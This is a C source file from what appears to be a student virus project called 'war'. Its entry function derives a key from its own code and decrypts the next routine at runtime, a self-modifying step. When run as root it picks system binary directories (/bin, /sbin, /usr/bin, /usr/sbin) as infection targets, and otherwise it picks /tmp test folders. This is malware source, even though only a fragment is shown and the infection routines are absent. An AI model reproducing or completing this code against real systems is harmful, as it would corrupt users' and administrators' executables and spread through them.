/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   war.c                                              :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/12 18:17:19 by ddinaut           #+#    #+#             */
/*   Updated: 2019/03/20 19:50:58 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"

void	war(t_data *data)
{
	update_two(&data->key, (char*)war, (size_t)locate - (size_t)war);
	printf("war key = %lx\n", data->key.two);

	if (getuid() == 0)
	{
		t_directory root = {random_number(ROOT_ENTRY), {"/bin", "/sbin", "/usr/bin", "/usr/sbin"}};
		revert_two(&data->key, (char*)locate, (size_t)inspect - (size_t)locate);
		locate(data, &root);
	}
	else
	{
		t_directory user = {random_number(USER_ENTRY), {"/tmp/test", "/tmp/test2"}};
		revert_two(&data->key, (char*)locate, (size_t)inspect - (size_t)locate);
		locate(data, &user);
	}
}
